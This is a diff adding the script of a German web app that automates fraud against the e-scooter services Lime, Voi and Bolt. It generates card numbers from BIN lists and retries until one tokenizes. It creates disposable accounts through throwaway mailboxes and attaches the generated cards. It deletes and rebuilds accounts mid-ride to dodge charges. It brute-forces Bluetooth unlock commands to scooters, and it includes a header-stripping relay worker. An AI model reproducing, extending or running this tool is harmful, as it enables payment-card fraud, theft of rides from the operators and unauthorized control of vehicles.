+  cstat("prüfe " + k.num.slice(0, 6) + " …", "");
+  k.tok = await tokenisieren(k);
+  k.ok = true;
+  speichern();
+  karteMalen();
+  cstat("Karte bestätigt · " + k.num.slice(0, 6), "g");
+}
+
+async function suchen(){
+  const liste = BIN.visa.concat(BIN.master).sort(() => Math.random() - 0.5);
+  for (let i = 0; i < liste.length; i++){
+    const k = karteBauen(liste[i]);
+    cstat("Versuch " + (i+1) + "/" + liste.length + " · " + liste[i], "");
+    try {
+      k.tok = await tokenisieren(k);
+      k.ok = true;
+      S.karten[S.brand] = k;
+      speichern();
+      karteMalen();
+      cstat("Treffer · " + liste[i], "g");
+      return;
+    } catch(e){
+      log("BIN " + liste[i] + ": " + kurz(e), "y");
+    }
+    await sleep(300);
+  }
+  cstat("keine BIN hat getragen", "e");
+  throw new Error("BIN-Suche erfolglos");
+}
+
+/* ═══════ KONTO ═══════ */
+
+const acct = () => S.acct[S.brand];
+function setAcct(a){ S.acct[S.brand] = a; speichern() }
+
+async function kontoTelefon(){
+  const tel = $("iPhone").value.trim();
+  if (tel.replace(/\D/g, "").length < 7) throw new Error("Handynummer fehlt");
+  if (S.brand === "voi"){
+    const r = await roh(V.voi.base + "/auth/verify/phone",
+      { method:"POST", headers:H(), body:J({ phone_number:tel, country_code:"DE", device_id:DEV }) });
+    if (r.status >= 400) throw new Error("Voi " + r.status + " · " + saub(r.text));
+  } else {
+    const r = await roh(V.bolt.base + "/user/register/phone",
+      { method:"POST", headers:H(), body:J({ phone:tel, country_code:"DE", device_id:DEV, version:"CN" }) });
+    if (r.status >= 400) throw new Error("Bolt " + r.status + " · " + saub(r.text));
+  }
+  setAcct({ ph:tel, t:"", bal:0 });
+  paint();
+  stat("Konto steht · jetzt CODE SENDEN", "ok");
+}
+
+async function kontoPruefen(){
+  const a = acct();
+  if (!a) throw new Error("kein Konto");
+
+  if (S.brand === "lime"){
+    if (!a.t && $("iOtp").value.trim()){
+      a.t = await limeLogin($("iOtp").value.trim());
+      setAcct(a);
+    }
+    if (!a.t) throw new Error("Konto ist noch nicht angemeldet");
+    const bal = await limeWallets(a.t);
+    if (bal === null){ stat("Token trägt nicht.", "e"); return }
+    a.bal = bal;
+    setAcct(a);
+    paint();
+    stat("Konto bestätigt.", "ok");
+    return;
+  }
+
+  const code = $("iOtp").value.trim();
+  if (!code) throw new Error("Code fehlt");
+
+  if (S.brand === "voi"){
+    const r = await roh(V.voi.base + "/auth/verify/code",
+      { method:"POST", headers:H(), body:J({ phone_number:a.ph, code:code, country_code:"DE" }) });
+    const t = r.json && (r.json.accessToken || r.json.token);
+    if (!t){ stat("Code falsch (" + r.status + ")", "e"); return }
+    a.t = t;
+  } else {
+    const r = await roh("https://node.bolt.eu/user/confirmVerification",
+      { method:"POST", headers:H(), body:J({ phone:a.ph, code:code, device_id:DEV }) });
+    const t = r.json && r.json.data && r.json.data.token;
+    if (!(r.json && r.json.code === 0 && t)){ stat("Code falsch (" + r.status + ")", "e"); return }
+    a.t = t;
+  }
+  setAcct(a);
+  paint();
+  stat("Konto bestätigt.", "ok");
+}
+
+async function kontoLoeschen(){
+  const a = acct();
+  try {
+    if (a && a.t){
+      if (S.brand === "lime") await roh(V.lime.base + "/v1/users/me", { method:"DELETE", headers:H(a.t) });
+      if (S.brand === "voi") await roh(V.voi.base + "/users/me", { method:"DELETE", headers:H(a.t) });
+      if (S.brand === "bolt") await roh("https://node.bolt.eu/user/delete", { method:"POST", headers:H(a.t), body:"{}" });
+    }
+  } catch(e){ log("Löschen: " + kurz(e), "y") }
+  S.acct[S.brand] = null;
+  S.fach[S.brand] = null;
+  try { localStorage.removeItem(PRE + "fach_" + S.brand) } catch(_){}
+  speichern();
+  paint();
+}
+
+/* ═══════ ABLAUF ═══════ */
+
+async function vorbereiten(){
+  if (S.brand !== "lime") throw new Error("Automatik nur für Lime");
+
+  stat("Schlüssel wird gesucht …", "warn");
+  await keySichern();
+
+  let a = acct();
+  if (!a || !a.t){
+    let mt = "";
+    for (let runde = 1; runde <= 2 && !mt; runde++){
+      if (runde > 1){ S.fach[S.brand] = null; log("Postfach wird ersetzt.", "y") }
+      const fach = await fachHolen();
+      stat("Mail wird angefordert … (" + runde + "/2)", "warn");
+      await limeMail(fach.adr);
+      stat("warte auf die Mail …", "warn");
+      mt = await linkSuchen(fach);
+      if (mt){
+        stat("melde an …", "warn");
+        a = { e:fach.adr, t:await limeLogin(mt), bal:0 };
+        setAcct(a);
+      } else {
+        log("Runde " + runde + ": keine Mail.", "y");
+      }
+    }
+    if (!mt) throw new Error("kein Link in der Mail");
+  }
+
+  let k = S.karten.lime;
+  if (!k || !k.ok){
+    stat("Karte wird geprüft …", "warn");
+    k = karteBauen();
+    S.karten.lime = k;
+    await pruefen();
+  }
+
+  if (!k.hinterlegt){
+    stat("Karte wird hinterlegt …", "warn");
+    await limeCard(a.t, k.tok);
+    k.hinterlegt = true;
+    speichern();
+  }
+
+  cstat("Konto und Karte fertig.", "g");
+  stat("fertig · jetzt ENTSPERREN", "ok");
+}
+
+async function starten(){
+  if (S.prov) throw new Error("läuft schon");
+  S.prov = true;
+  paint();
+  try { await vorbereiten() }
+  finally { S.prov = false; paint() }
+}
+
+async function erneuern(){
+  if (S.prov) throw new Error("läuft schon");
+  S.prov = true;
+  paint();
+  try {
+    stat("altes Konto wird entfernt …", "warn");
+    await kontoLoeschen();
+    devNeu();
+    S.karten[S.brand] = karteBauen();
+    S.erneuert = false;
+    if (S.fahrt.laufend) S.fahrt.start = Date.now();
+    speichern();
+    karteMalen();
+    await vorbereiten();
+    stat("neu aufgesetzt · Roller läuft weiter", "ok");
+  } finally { S.prov = false; paint() }
+}
+
+/* ═══════ BLUETOOTH ═══════ */
+
+const UU = [
+  "6e400001-b5a3-f393-e0a9-e50e24dcca9e",
+  "0000ffe0-0000-1000-8000-00805f9b34fb",
+  "0000fff0-0000-1000-8000-00805f9b34fb",
+  "0000ff00-0000-1000-8000-00805f9b34fb",
+  "0000ffb0-0000-1000-8000-00805f9b34fb",
+  "0000fe95-0000-1000-8000-00805f9b34fb",
+  "0000fee0-0000-1000-8000-00805f9b34fb",
+  "0000ffd0-0000-1000-8000-00805f9b34fb",
+  "49535343-fe7d-4ae5-8fa9-9fafd205e455"
+];
+
+const ASCII_UN = ["WS", "ON", "K1", "WAKE", "UN", "U1", "UNLOCK", "UL", "OPEN", "GO", "START"];
+const ASCII_LK = ["WL", "OFF", "LOCK", "K0", "LK", "M0", "LO", "STOP"];
+
+const enc = s => new TextEncoder().encode(s);
+const bufb = a => new Uint8Array(a).buffer;
+
+function rahmenBinaer(){
+  const raus = [];
+  for (const p of [0x21, 0x22]){
+    for (const mitPay of [false, true]){
+      for (const variante of [0, 1, 2, 3]){
+        const body = [0x5A, 0xA5, 0x00].concat([p], mitPay ? [0x01] : []);
+        body[2] = body.length + 2;
+        let sum = 0, x = 0;
+        for (const b of body){ sum += b; x ^= b }
+        const crc = variante === 0 ? ((~sum) & 0xFF)
+                  : variante === 1 ? (x & 0xFF)
+                  : variante === 2 ? (sum & 0xFF) : 0x00;
+        raus.push(bufb(body.concat([crc])));
+      }
+    }
+  }
+  return raus;
+}
+
+function rahmen(art){
+  const raus = [];
+  for (const c of (art === "lk" ? ASCII_LK : ASCII_UN)){
+    raus.push(bufb(enc(c)));
+    raus.push(bufb(enc(c + "\r\n")));
+    raus.push(bufb(enc("*" + c + "#")));
+  }
+  raus.push(...rahmenBinaer());
+  return raus;
+}
+
+async function verbinden(){
+  if (!navigator.bluetooth) throw new Error("kein Bluetooth in diesem Browser");
+  stat("Gerät in der Liste wählen …", "warn");
+  let d;
+  try {
+    d = await navigator.bluetooth.requestDevice({ acceptAllDevices:true, optionalServices:UU });
+  } catch(e){
+    throw new Error(/cancel|No device/i.test(String(e && e.message)) ? "Auswahl abgebrochen" : kurz(e));
+  }
+  d.addEventListener("gattserverdisconnected", () => {
+    log("Verbindung getrennt.", "e");
+    S.chans = []; S.srv = null; S.best = null;
+    $("bt").textContent = "getrennt"; $("bt").classList.remove("on");
+    stat("getrennt", "warn");
+  });
+
+  stat("verbinde …", "warn");
+  let srv = null;
+  for (let i = 0; i < 5 && !srv; i++){
+    try { srv = await d.gatt.connect() } catch(_){ await sleep(1500) }
+  }
+  if (!srv) throw new Error("Kopplung kam nicht zustande · Code vom Display");
+
+  S.srv = srv;
+  S.chans = [];
+  S.antworten = 0;
+
+  let dienste = [];
+  try { dienste = await srv.getPrimaryServices() } catch(_){}
+  if (!dienste.length){
+    for (const u of UU){ try { dienste.push(await srv.getPrimaryService(u)) } catch(_){} }
+  }
+
+  const gemerkt = lg("best_" + S.brand, "");
+
+  for (const ds of dienste){
+    let ks = [];
+    try { ks = await ds.getCharacteristics() } catch(_){ continue }
+    for (const k of ks){
+      if (!k.properties.write && !k.properties.writeWithoutResponse) continue;
+      const ch = { svc:ds.uuid, wr:k.uuid, char:k };
+      try {
+        if (k.properties.notify || k.properties.indicate){
+          await k.startNotifications();
+          k.addEventListener("characteristicvaluechanged", e => {
+            S.antworten++;
+            const v = e.target.value;
+            const a = new Uint8Array(v.buffer, v.byteOffset || 0, v.byteLength);
+            log("← " + [...a].slice(0, 12).map(x => x.toString(16).padStart(2, "0")).join(" "), "h");
+          });
+          ch.notify = true;
+        }
+      } catch(_){}
+      S.chans.push(ch);
+    }
+  }
+
+  if (!S.chans.length) throw new Error("kein schreibbarer Kanal");
+
+  S.chans.sort((a, b) => {
+    const sa = (a.notify ? 5 : 0) + (a.wr === gemerkt ? 10 : 0) + (a.char.properties.write ? 1 : 0);
+    const sb = (b.notify ? 5 : 0) + (b.wr === gemerkt ? 10 : 0) + (b.char.properties.write ? 1 : 0);
+    return sb - sa;
+  });
+  S.best = S.chans[0];
+
+  log(S.chans.length + " Kanäle", "g");
+  $("bt").textContent = "verbunden · " + (d.name || "Gerät");
+  $("bt").classList.add("on");
+  stat("verbunden", "ok");
+}
+
+async function sende(ch, a){
+  if (ch.char.properties.writeWithoutResponse && ch.char.writeValueWithoutResponse)
+    return ch.char.writeValueWithoutResponse(a);
+  return ch.char.writeValue(a);
+}
+
+async function befehl(art){
+  if (!S.chans.length) await verbinden();
+  if (!S.chans.length) throw new Error("nicht verbunden");
+
+  S.antworten = 0;
+  const raus = rahmen(art);
+  const reihe = S.best ? [S.best].concat(S.chans.filter(c => c !== S.best)) : S.chans;
+  let gesendet = 0;
+
+  for (const ch of reihe.slice(0, 4)){
+    for (const r of raus){
+      try { await sende(ch, r); gesendet++ } catch(_){}
+      await sleep(130);
+      if (S.antworten){
+        S.best = ch;
+        lg("best_" + S.brand, ch.wr);
+        log("Antwort von " + ch.wr.slice(0, 8), "g");
+        return { gesendet:gesendet, antwort:S.antworten };
+      }
+    }
+  }
+  return { gesendet:gesendet, antwort:S.antworten };
+}
+
+/* ═══════ QR ═══════ */
+
+let jsqrLaden = null;
+function jsqr(){
+  if (window.jsQR) return Promise.resolve();
+  if (jsqrLaden) return jsqrLaden;
+  jsqrLaden = new Promise((ok, we) => {
+    const s = document.createElement("script");
+    s.src = "https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js";
+    s.onload = ok;
+    s.onerror = () => we(new Error("Scanner nicht ladbar"));
+    document.head.appendChild(s);
+  });
+  return jsqrLaden;
+}
+
+function kameraStopp(){
+  if (S.cam){ S.cam.getTracks().forEach(t => t.stop()); S.cam = null }
+  $("qr").style.display = "none";
+}
+
+async function kamera(){
+  await jsqr();
+  S.cam = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"environment" } });
+  const v = $("vid");
+  v.srcObject = S.cam;
+  await v.play();
+  $("qr").style.display = "block";
+  S.t0 = Date.now();
+
+  const scannen = () => {
+    if (!S.cam) return;
+    if (Date.now() - S.t0 > 60000){ kameraStopp(); stat("Kamera aus.", "warn"); return }
+    if (v.readyState === v.HAVE_ENOUGH_DATA){
+      const c = document.createElement("canvas");
+      c.width = v.videoWidth;
+      c.height = v.videoHeight;
+      const x = c.getContext("2d");
+      x.drawImage(v, 0, 0, c.width, c.height);
+      const d = x.getImageData(0, 0, c.width, c.height);
+      const r = window.jsQR(d.data, d.width, d.height);
+      if (r && r.data){
+        kameraStopp();
+        $("qrbox").textContent = "Code: " + r.data;
+        stat("QR gelesen · jetzt ENTSPERREN", "ok");
+        return;
+      }
+    }
+    requestAnimationFrame(scannen);
+  };
+  requestAnimationFrame(scannen);
+}
+
+/* ═══════ ANZEIGE ═══════ */
+
+function paint(){
+  const a = acct();
+  const k = S.karten[S.brand];
+  $("uMail").textContent = a ? (a.e || a.ph || "–") : "–";
+  $("uKarte").textContent = k
+    ? (k.num.slice(-4) + (k.hinterlegt ? " · hinterlegt" : k.ok ? " · geprüft" : " · neu"))
+    : "–";
+  karteMalen();
+  $("bOtp").disabled = S.warte;
+  $("bPhone").disabled = S.prov;
+  $("bStart").disabled = S.prov;
+  $("bKomplett").disabled = S.prov;
+  $("bNeu").disabled = S.prov;
+}
+
+/* ═══════ SPEICHERN ═══════ */
+
+function speichern(){
+  ls("karten", S.karten);
+  ls("pk", S.pk);
+  ls("acct", S.acct);
+  ls("brand", S.brand);
+}
+
+/* ═══════ VERDRAHTUNG ═══════ */
+
+function tue(id, fn){
+  $(id).onclick = async () => {
+    const b = $(id);
+    if (b.disabled) return;
+    b.disabled = true;
+    try { await fn() }
+    catch(e){ stat(kurz(e), "e"); log(kurz(e), "e") }
+    finally { b.disabled = false; paint() }
+  };
+}
+
+document.querySelectorAll(".brands button").forEach(b => {
+  b.onclick = () => {
+    S.brand = b.dataset.b;
+    speichern();
+    document.querySelectorAll(".brands button").forEach(x => x.classList.toggle("on", x.dataset.b === S.brand));
+    paint();
+    stat(V[S.brand].name + " gewählt.", "");
+  };
+});
+
+tue("bStart", starten);
+tue("bKomplett", erneuern);
+tue("bMe", kontoPruefen);
+tue("bDel", async () => { await kontoLoeschen(); stat("Konto entfernt.", "ok") });
+tue("bPhone", kontoTelefon);
+
+tue("bNeu", async () => {
+  fahrtStoppen();
+  S.karten[S.brand] = karteBauen();
+  S.erneuert = false;
+  speichern();
+  karteMalen();
+  cstat("neue Karte · jetzt BIN-SUCHE oder ALLES ANLEGEN", "");
+});
+
+tue("bBin", suchen);
+
+tue("bBinUse", async () => {
+  const v = $("iBin").value.replace(/\D/g, "");
+  if (v.length < 6) throw new Error("BIN braucht mindestens 6 Ziffern");
+  if (v.length > 8) throw new Error("BIN hat höchstens 8 Ziffern");
+  fahrtStoppen();
+  S.karten[S.brand] = karteBauen(v);
+  speichern();
+  karteMalen();
+  await pruefen();
+});
+
+tue("bCardDel", async () => {
+  fahrtStoppen();
+  S.karten[S.brand] = null;
+  speichern();
+  karteMalen();
+  cstat("Karte entfernt", "");
+});
+
+tue("bUnlock", async () => {
+  const r = await befehl("un");
+  if (r.antwort){
+    fahrtStarten();
+    stat("Roller hat geantwortet · Zähler läuft", "ok");
+  } else if (r.gesendet){
+    fahrtStarten();
+    stat("Befehle raus (" + r.gesendet + ") · Roller antippen, wenn nichts passiert", "warn");
+  } else {
+    stat("nichts gesendet", "warn");
+  }
+});
+
+tue("bLock", async () => {
+  const r = await befehl("lk");
+  fahrtStoppen();
+  stat(r.gesendet ? "gesperrt · Zähler gestoppt" : "nichts gesendet",
+    r.gesendet ? "ok" : "warn");
+});
+
+tue("bConn", verbinden);
+tue("bScan", kamera);
+$("bQrClose").onclick = kameraStopp;
+
+tue("bQrCopy", async () => {
+  const t = $("qrbox").textContent.replace(/^Code:\s*/, "").trim();
+  if (!t) throw new Error("noch kein Code");
+  try { await navigator.clipboard.writeText(t); stat("Code kopiert.", "ok") }
+  catch(_){ stat("Kopieren nicht möglich.", "warn") }
+});
+
+tue("bDiag", async () => {
+  log("=== DIAGNOSE ===", "h");
+  log("Bluetooth: " + (navigator.bluetooth ? "ja" : "nein"));
+  log("Relay: " + (S.relay || "keiner"));
+  log("Kanäle: " + S.chans.length);
+  for (const c of S.chans) log("  " + c.svc + " / " + c.wr + (c.notify ? " notify" : ""));
+  log("Schlüssel: " + (S.keyOk ? "vorhanden" : "fehlt"));
+  log("Belastung: " + euro(belastung()) + " von " + euro(LIMIT));
+  log("=== ENDE ===", "h");
+  stat("Diagnose geschrieben.", "ok");
+});
+
+$("bLeer").onclick = () => { $("log").textContent = "" };
+
+tue("bFrei", async () => { S.tot = {}; stat("Sperren aufgehoben.", "ok") });
+
+tue("bSaveRelay", async () => {
+  let v = $("iRelay").value.trim();
+  if (!v) throw new Error("Feld leer");
+  if (!/^https:\/\//.test(v)) v = "https://" + v;
+  if (!/\?url=$/.test(v)) v = v.replace(/[?&]url=.*$/, "").replace(/\/$/, "") + "/?url=";
+  S.relay = v;
+  ls("relay", v);
+  $("iRelay").value = v;
+  stat("Relay gespeichert.", "ok");
+});
+
+tue("bRelayDel", async () => {
+  S.relay = "";
+  ls("relay", "");
+  $("iRelay").value = "";
+  stat("Relay gelöscht.", "ok");
+});
+
+tue("bNet", async () => {
+  const ziel = V.lime.base + "/v2/onboarding/magic-link";
+  const probe = Q({ email:"probe@example.com", user_agreement_country_code:"DE", user_agreement_version:"4" });
+  log("=== NETZTEST ===", "h");
+  const pruef = async (name, fn) => {
+    try {
+      const r = await fn();
+      const t = await r.text();
+      const ok = r.status < 500 && !MUELL.test(t);
+      log((ok ? "OK  " : "HTTP " + r.status + "  ") + name, ok ? "g" : "e");
+    } catch(e){ log("FEHLT  " + name + " · " + kurz(e), "e") }
+  };
+  if (S.relay){
+    await pruef("RELAY GET", () => fetch(S.relay + encodeURIComponent(ziel)));
+    await pruef("RELAY POST", () => fetch(S.relay + encodeURIComponent(ziel),
+      { method:"POST", headers:FORM(), body:probe }));
+  }
+  for (const w of POSTWEGE)
+    await pruef(w.n, () => fetch(w.f(ziel), { method:"POST", headers:FORM(), body:probe }));
+  log("=== ENDE ===", "h");
+  stat("Test beendet.", "ok");
+});
+
+tue("bCopyW", async () => {
+  try { await navigator.clipboard.writeText($("workerCode").value); stat("kopiert.", "ok") }
+  catch(_){ $("workerCode").select(); stat("markiert · jetzt kopieren.", "warn") }
+});
+
+tue("bPk", async () => {
+  const v = $("iPk").value.trim();
+  if (!PK_FORM.test(v)) throw new Error("sieht nicht wie ein pk_live_… aus");
+  S.pk[S.brand] = v;
+  S.keyOk = v;
+  ls("pk", S.pk);
+  paint();
+  stat("Schlüssel gespeichert.", "ok");
+});
+
+tue("bRaw", async () => {
+  if (!S.chans.length) throw new Error("nicht verbunden");
+  const svc = $("iSvc").value.trim(), ch = $("iCh").value.trim();
+  let ziel = S.best || S.chans[0];
+  if (svc && ch){
+    const s = await S.srv.getPrimaryService(svc);
+    const c = await s.getCharacteristic(ch);
+    ziel = { svc:svc, wr:ch, char:c };
+    S.best = ziel;
+  }
+  const t = $("iRaw").value.trim();
+  if (!t) throw new Error("nichts eingegeben");
+  const a = /^[0-9a-f\s]{4,}$/i.test(t)
+    ? bufb(t.replace(/[^0-9a-f]/gi, "").match(/../g).map(h => parseInt(h, 16)))
+    : bufb(enc(t));
+  await sende(ziel, a);
+  log("gesendet", "g");
+});
+
+tue("bReset", async () => {
+  clearInterval(S.fahrt.timer);
+  Object.keys(localStorage).filter(k => k.indexOf(PRE) === 0).forEach(k => localStorage.removeItem(k));
+  location.reload();
+});
+
+/* ═══════ START ═══════ */
+
+function boot(){
+  S.karten = lg("karten", {}) || {};
+  S.pk = lg("pk", {}) || {};
+  S.acct = lg("acct", {}) || {};
+  S.relay = lg("relay", "") || "";
+  S.brand = lg("brand", "lime");
+  if (!V[S.brand]) S.brand = "lime";
+  S.keyOk = (S.pk.lime && PK_FORM.test(S.pk.lime)) ? S.pk.lime : "";
+  S.tot = {};
+
+  $("iRelay").value = S.relay;
+  $("workerCode").value = WORKER;
+  const a = acct();
+  if (a && a.ph) $("iPhone").value = a.ph;
+  if (S.pk[S.brand]) $("iPk").value = S.pk[S.brand];
+
+  document.querySelectorAll(".brands button").forEach(x => x.classList.toggle("on", x.dataset.b === S.brand));
+  paint();
+  log("bereit · " + V[S.brand].name, "g");
+  stat("bereit", "");
+}
+
+const WORKER = `export default {
+  async fetch(req){
+    const cors = {
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Headers": "*",
+      "Access-Control-Allow-Methods": "GET,POST,PUT,PATCH,DELETE,OPTIONS",
+      "Access-Control-Max-Age": "86400"
+    };
+    if (req.method === "OPTIONS") return new Response(null, { status: 204, headers: cors });
+
+    const u = new URL(req.url);
+    let ziel = u.searchParams.get("url");
+    if (!ziel && u.pathname.length > 1){
+      ziel = decodeURIComponent(u.pathname.slice(1)) + (u.search || "");
+    }
+    if (!ziel) return new Response("keine url", { status: 400, headers: cors });
+    if (!/^https?:\\/\\//i.test(ziel)) ziel = "https://" + ziel;
+
+    const h = new Headers(req.headers);
+    ["host","origin","referer","cf-connecting-ip","cf-ray","cf-visitor","cf-ipcountry",
+     "x-forwarded-proto","x-real-ip","accept-encoding","connection","content-length"]
+      .forEach(k => h.delete(k));
+
+    const init = { method: req.method, headers: h, redirect: "follow" };
+    if (req.method !== "GET" && req.method !== "HEAD") init.body = await req.arrayBuffer();
+
+    const ctl = new AbortController();
+    const t = setTimeout(() => ctl.abort(), 25000);
+    init.signal = ctl.signal;
+
+    try {
+      const r = await fetch(ziel, init);
+      clearTimeout(t);
+      const out = new Headers(r.headers);
+      ["content-encoding","content-length","transfer-encoding","connection"].forEach(k => out.delete(k));
+      Object.entries(cors).forEach(([k, v]) => out.set(k, v));
+      return new Response(r.body, { status: r.status, headers: out });
+    } catch(e){
+      clearTimeout(t);
+      return new Response(JSON.stringify({ error: "relay_fail", detail: String(e) }),
+        { status: 502, headers: { ...cors, "Content-Type": "application/json" } });
+    }
+  }
+};`;
+
+document.addEventListener("visibilitychange", () => { if (document.hidden) kameraStopp() });
+window.addEventListener("error", e => log("Fehler: " + kurz(e.message), "e"));
+window.addEventListener("unhandledrejection", e => log("Promise: " + kurz(e.reason), "e"));
+
+boot();
+
+if ("serviceWorker" in navigator) navigator.serviceWorker.register("./sw.js").catch(() => {});
+</script>
+</body>
+</html>
